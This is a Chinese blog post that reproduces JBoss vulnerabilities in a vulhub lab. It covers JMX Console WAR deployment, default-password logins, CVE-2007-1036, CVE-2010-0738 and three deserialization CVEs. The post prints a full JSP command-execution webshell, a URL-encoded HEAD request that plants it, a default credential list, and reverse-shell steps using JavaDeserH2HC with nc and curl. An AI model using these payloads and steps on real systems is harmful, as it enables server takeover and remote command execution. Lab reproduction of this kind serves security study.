[合集 \- 漏洞复现(6\)](https://github.com)[1\.mysql弱密码爆破10\-28](https://github.com/left-shoulder/p/18511384)[2\.Tomcat弱口令上传war包10\-27](https://github.com/left-shoulder/p/18509031)[3\.Hadoop未授权访问11\-01](https://github.com/left-shoulder/p/18521194)[4\.Redis未授权访问11\-03](https://github.com/left-shoulder/p/18523791)[5\.weblogic历史漏洞11\-14](https://github.com/left-shoulder/p/18545731)6\.JBOSS漏洞复现11\-16收起
# Jboss漏洞复现


`统一靶场：/vulhub/jboss`


## JMX Console 未授权访问漏洞



```
# 介绍	
	JBoss的webUI界面 http://ip:port/jmx-console未授权访问(或默认密码admin/admin）
	可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell

```

#### 漏洞发现


 访问 `http://ip:port/jmx-console`能直接访问或弱口令登录则存在漏洞


![image-20241115120532157](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115120532157.png)
#### 远程部署war包


1. 找到 jboss.deployment 选项(Jboss自带的部署功能）中的flavor\=URL,type\=DeploymentScanner点进去 (通过url的方式远程部署)


![image-20241115120908028](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115120908028.png)
2. 进入页面后找到addURL


![image-20241115122608530](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115122608530.png)
3. 在vps上部署war包



```
# 打包jsp马为war包
jar -cvf shell.war shell.jsp

# 在vps上启动web服务
python3 -m http.server

# 输入war包请求地址
http://your-ip:8000/cmd.war

```

![image-20241115122640983](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115122640983.png)
4. 随后点击`BacktoMBeanView`来到URLList中查看Value值是否已经部署好，最后点击 `Apply Changes`


![image-20241115122813709](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115122813709.png)
5. 返回`jmx-console`目录找到 `jboss.web.deployment` 查看是否存在我们部署的war木马


![image-20241115122852417](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115122852417.png)
6. 访问：`http://your-ip/shell/shell.jsp`连接蚁剑即可


## Jboss弱口令Getshell


 `JBoss Administration Console`存在默认账号密码可以登录，在后台部署war包getshell



```
# jboss弱口令

admin/admin
jboss/admin
admin/jboss
admin/123456
admin/password

```

1. 点击`Administration Console` ，输入默认账号`admin/vulhub`进入后台


![image-20241115124436272](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115124436272.png)
2. 进入后找到`web Application （WAR）`，点击`Add a new resource`，部署一个war包（木马）


![image-20241115124625618](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115124625618.png)
3. 访问`http://your-ip:8080/cmd/cmd.jsp`，蚁剑连接


![image-20241115124909378](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115124909378.png)
## CVE\-2007\-1036



```
	JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到JMx控制台，并在其中执行任何功能。
	该漏洞利用的是后台中jboss.admin->DeploymentFileRepository-〉store（）方法，通过向四个参数传入信息，达到上传shell的目的
	p1传入的是部署的war包名字，p2传入的是上传的文件的文件名，p3传入的是上传文件的文件格式，p4传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。p2和p3可以进行文件的拼接，例如p2=she，p3=1l.jsp。这个时候服务器还是会进行拼接，将shell.jsp传入到指定路径下。

```

1. 访问如下URL确定store()方法



```
http: //your-ip:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository

```

2. 部署war包


![image-20241115162542363](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115162542363.png)
* p1为：部署的war包名字
* p2为：上传的文件的文件名
* p3为：上传文件的文件格式
* p4为：上传文件中的内容（jsp木马）



```
<%@ page import="java.io.*" %>
<% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) { String s
= null; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedRe
ader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output
+= s +"\r\n"; } } catch(IOException e) { e.printStackTrace(); } } out.println(output);%>

```

3. 访问`http://your-ip:8080/job1/job1.jsp`即可


![image-20241115163147846](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115163147846.png)
## CVE\-2010\-0738（JMX Console安全认证绕过）



```
	利用原理与CVE-2007-1036相同，只不过利用HEAD请求方法绕过GET和P0ST请求的限制
	影响版本：jboss4.2.0-jboss4.3.0

```

1. 抓包将GET请求换为HEAD，构造如下请求头



```
HEAD /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRep
ository&methodIndex=5&arg0=../jmx-console.war/&arg1=shell&arg2=.jsp&arg3=%3c%25%40%20%70%61%
67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%69%6f%2e%2a%22%20%25%3e%20%0d%0a%3c%25%20%53%74%72%69%6e%67%20%63%6d%64%20%3d%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%3b%20%53%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%22%22%3b%20%69%66%28%63%6d%64%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%53%74%72%69%6e%67%20%73%20%3d%20%6e%75
%6c%6c%3b%20%74%72%79%20%7b%20%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%63%6d%64%29%3b%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%73%49%20%3d%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72
%28%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%20%77%68%69%6c%65%28%28%73%20%3d%20%73%49%2e%72%65%61%64%4c%69%6e%65%28%29%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%6f%75%74%70%75%74%20%2b%3d%20%73%20%2b%22%5c%72%5c%6e%22%3b%20%7d%20%7d%20%63%61%74%63%68%28%49%4f%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%20%65%2e%70%72%69%6e%74%53%74%61%63%6b%54%72%61%63%65%28%29%3b%20%7d%20%
7d%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6f%75%74%70%75%74%29%3b%25%3e&arg4=True HTTP/1.1

```

* arg3为jsp木马，只不过URL编码了


![image-20241115163604047](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115163604047.png)
2. 访问 `http://your-ip:8080/jmx-console/shell.jsp?cmd=id`


![image-20241115163803260](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115163803260.png)
## CVE\-2015\-7501（JMXInvokerServlet 反序列化漏洞）



```
	Java反序列化错误类型，存在于Jboss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，影响非常广
	jboss在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，从而导致了漏洞。

```

#### 漏洞发现


访问 `http://ip:port/invoker/JMXInvokerServlet`出现下载文件，即存在漏洞


#### 漏洞利用


1. 下载`JavaDeserH2HC`



```
git clone https://github.com/joaomatosf/JavaDeserH2HC.git

cd JavaDeserH2HC

```

2. 编译文件和使用工具



```
# 编译文件
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
    
# 使用工具生成反序列化字符串
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 攻击机ip:端口    

```

![image-20241115170120757](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115170120757.png)
3. 监听6666端口，使用curl将生成的文件传给Jboss



```
# 监听
nc -lvvp 6666

# 传输恶意的字符串让Jboss反序列化
curl http://靶机-ip:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollecti
onsHashMap.ser

```

![image-20241115170848392](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115170848392.png)
* 反弹shell成功！


![image-20241115170921254](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115170921254.png)
## CVE\-2017\-7504（JBossMQ JMS 反序列化漏洞）



```
	CVE-2017-7504漏洞与CVE-2015-7501的漏洞原理相似，只是利用的路径稍微出现了变化，CVE-2017-7504出现在/jbossmq-httpil/HTTPServerILServlet路径下。
	影响范围：JBoss AS 4.x及之前版本

```

#### 漏洞发现


 访问`/jbossmq-httpil/HTTPServerILServlet`，若出现如下界面则存在漏洞


![image-20241115230020893](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115230020893.png)
#### 漏洞利用


 继续利用`JavaDeserH2HC`，攻击机记得开启6666端口



```
# 利用上个漏洞已经生成了反序列化字符串，直接使用curl即可
curl http://靶机-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser

```

![image-20241115230350086](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115230350086.png)
* 成功！


![image-20241115230430761](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115230430761.png)
## CVE\-2017\-12149（JbossApplicationServer反序列化命令执行漏洞）



```
	和上面的差不多，路径换成/invoker/readonly
	影响范围：JBoss 5.x - 6.x

```

#### 漏洞发现


 访问`/invoker/readonly`，若返回如下显示状态码为500的报错界面,则证明漏洞存在


![image-20241115231244215](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115231244215.png)
#### 漏洞利用


* 继续利用`JavaDeserH2HC`



```
curl http://靶机-ip:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser

```

* shell就来了


![image-20241115231155913](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241115231155913.png)
  * [Jboss漏洞复现](#jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)
* [JMX Console 未授权访问漏洞](#jmx-console-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E)
* [漏洞发现](#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0)
* [远程部署war包](#%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2war%E5%8C%85)
* [Jboss弱口令Getshell](#jboss%E5%BC%B1%E5%8F%A3%E4%BB%A4getshell)
* [CVE\-2007\-1036](#cve-2007-1036)
* [CVE\-2010\-0738（JMX Console安全认证绕过）](#cve-2010-0738jmx-console%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87)
* [CVE\-2015\-7501（JMXInvokerServlet 反序列化漏洞）](#cve-2015-7501jmxinvokerservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E):[milou加速器](https://jiechuangmoxing.com)
* [漏洞发现](#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-1)
* [漏洞利用](#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8)
* [CVE\-2017\-7504（JBossMQ JMS 反序列化漏洞）](#cve-2017-7504jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)
* [漏洞发现](#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-2)
* [漏洞利用](#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1)
* [CVE\-2017\-12149（JbossApplicationServer反序列化命令执行漏洞）](#cve-2017-12149jbossapplicationserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)
* [漏洞发现](#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-3)
* [漏洞利用](#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2)

   ![](https://github.com/cnblogs_com/blogs/831478/galleries/2422693/o_240923102931_1.png)    - **本文作者：** [left\_shoulder](https://github.com)
 - **本文链接：** [https://github.com/left\-shoulder/p/18549594](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
